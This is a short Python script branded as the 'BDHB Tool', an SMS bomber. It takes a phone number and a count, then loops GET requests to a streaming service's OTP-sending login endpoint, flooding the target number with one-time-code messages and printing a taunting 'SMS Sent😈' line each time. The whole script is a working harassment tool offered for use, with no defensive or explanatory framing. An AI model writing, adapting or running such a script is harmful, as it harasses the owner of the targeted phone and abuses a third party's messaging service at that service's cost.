# -*- coding: utf-8 -*-


logo = """  ____   _____   _    _  ____  
|  _ \ |  __ \ | |  | ||  _ \ 
| |_) || |  | || |__| || |_) |
|  _ < | |  | ||  __  ||  _ < 
| |_) || |__| || |  | || |_) |
|____/ |_____/ |_|  |_||____/ 



       😉welocme to 🇧🇩BDHB☣️ Tool


"""

    	
    	
print(logo)

import requests

number=str(input(" Enter The Number👉 : "))

amount=int(input(" Enter The Amount👉 : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range(amount):
	
	requests.get(api)
	
	print(str(i+1)+" ☑️BDHB SMS Sent😈")
